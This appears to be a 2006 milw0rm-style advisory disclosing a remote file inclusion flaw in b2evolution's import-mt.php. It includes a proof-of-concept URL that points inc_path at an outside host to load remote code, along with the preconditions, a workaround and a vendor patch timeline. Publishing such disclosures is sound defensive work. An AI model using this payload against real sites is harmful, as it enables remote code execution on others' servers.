@@ -1,0 +1,46 @@
+Severity: High
+ Title: b2evolution Remote File inclusion Vulnerability
+ Date: 28.11.06
+ Author: tarkus (tarkus (at) tiifp (dot) org)
+ Web: https://tiifp.org/tarkus
+ Vendor: b2evolution (http://b2evolution.net/)
+ Affected Product(s): b2evolution 1.8.5 - 1.9 beta
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+
+Description:
+------------
+
+Line 67 of import-mt.php (blogs/inc/CONTROL/imports):
+
+>
+>require_once $inc_path.'MODEL/files/_file.funcs.php';
+>
+
+
+
+PoC:
+----
+
+http://<victim>/<b2epath>/inc/CONTROL/imports/import-mt.php?basepath=foo&inc_path=https://tiifp.org/tarkus/PoC/
+
+register_globals and allow_url_fopen have to be On
+
+
+Workaround:
+-----------
+
+Put the following line at the beginning of the file.
+
+if( !defined('EVO_MAIN_INIT') ) die( 'Please, do not access this page \
+directly.' );
+
+
+
+Vendor Response:
+----------------
+
+Reported to Vendor:     10.11.06
+Vendor response:        10.11.06
+Patch in CVS:           10.11.06
+
+# milw0rm.com [2006-11-29]
